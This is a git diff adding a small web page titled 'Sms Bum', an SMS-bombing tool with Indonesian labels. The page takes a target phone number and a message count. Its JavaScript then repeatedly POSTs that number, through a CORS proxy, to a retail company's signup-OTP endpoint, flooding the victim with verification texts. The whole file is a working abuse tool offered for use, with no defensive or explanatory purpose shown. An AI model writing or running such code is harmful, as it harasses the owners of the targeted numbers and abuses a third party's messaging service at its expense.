@@ -1,0 +1,113 @@
+<html>
+<head>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css" integrity="sha384-r4NyP46KrjDleawBgD5tp8Y7UzmLA05oM1iAEQ17CSuDqnUK2+k9luXQOfXJCJ4I" crossorigin="anonymous"/>
+</head>
+<body>
+    
+<div class="container">
+    <h1 class="text-center mb-3">Sms Bum</h1>
+
+    <div class="mb-3">
+        <label for="exampleFormControlInput1" class="form-label">Nomor Telpon</label>
+        <input type="text" name="phone" input-cuk="phone" class="form-control" />
+    </div>
+    <div class="mb-3">
+        <label for="exampleFormControlInput1" class="form-label">Jumlah Sms</label>
+        <input type="number" name="jumlah" input-cuk="amount" class="form-control" />
+    </div>
+    <select class="form-select mb-3" name="opsi" select-cuk="optional" aria-label="Default select example">
+        <option >Pilih server</option>
+        <option  value="1">Mapcup</option>
+      </select>
+    <div class="text-center"><button onClick="senderFunc()" class="btn btn-primary btn-lg"  >Submit</button></div>
+</div>
+</body>
+</html>
+
+<script src="https://unpkg.com/nprogress@0.2.0/nprogress.js"></script>
+<link rel='stylesheet' href='https://unpkg.com/nprogress@0.2.0/nprogress.css'/>
+<script>
+
+// create data input binding
+var attributInput = 'input-cuk';
+var attributSelect = 'select-cuk';
+var elInput = document.querySelectorAll('[' + attributInput + ']'),
+elSelect = document.querySelectorAll('[' + attributSelect + ']'),
+dataState = {};
+    
+elInput.forEach(function(elemen){
+    if(elemen.type == 'text' || elemen.type == 'textarea' || elemen.type == 'number'){
+        let propertiesToBind = elemen.getAttribute(attributInput);
+        elemen.onkeyup = function(){
+            dataState[propertiesToBind] = elemen.value;
+        }
+    }
+})
+
+elSelect.forEach(function(elemen){
+    if(elemen.type == 'select-one'){
+        let propertiesToBind = elemen.getAttribute(attributSelect);
+        elemen.onchange = function(){
+            dataState[propertiesToBind] = elemen.value;
+        }
+    }
+})
+
+
+    console.log(dataState);
+
+function mapclub(){
+    let formData = new FormData;
+    formData.append('phone', dataState.phone);
+    NProgress.start();
+    for(let i = 0; i < parseInt(dataState.amount); i++){
+            console.log("gass");
+            fetch('https://cors-anywhere.herokuapp.com/' + 'https://cmsapi.mapclub.com/api/signup-otp', {
+            method: 'POST',
+            body: formData
+            })
+            .then((response) => response.json())
+            .then((result) => {
+                console.log(result);
+                setTimeout(() => {
+                    //
+                }, 10000);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert("Error");
+            });
+
+    }
+    NProgress.done();
+    alert("sukses");
+}
+
+function senderFunc(){
+    
+    if(dataState.phone == '' || dataState.phone == null || dataState.phone == undefined){
+        alert("nomor telpon tidak boleh kosong");
+        return '';
+    }
+    if(dataState.amount == '' || dataState.amount == null){
+        alert("jumlah tidak boleh kosong");
+        return '';       
+    }
+
+    if(dataState.optional == null || dataState.optional == ''){
+        alert("Pilih servernya pak");
+        return '';         
+    }
+
+    if(dataState.optional == "1"){
+        mapclub();
+    }
+    
+    
+
+}
+
+
+
+
+</script>
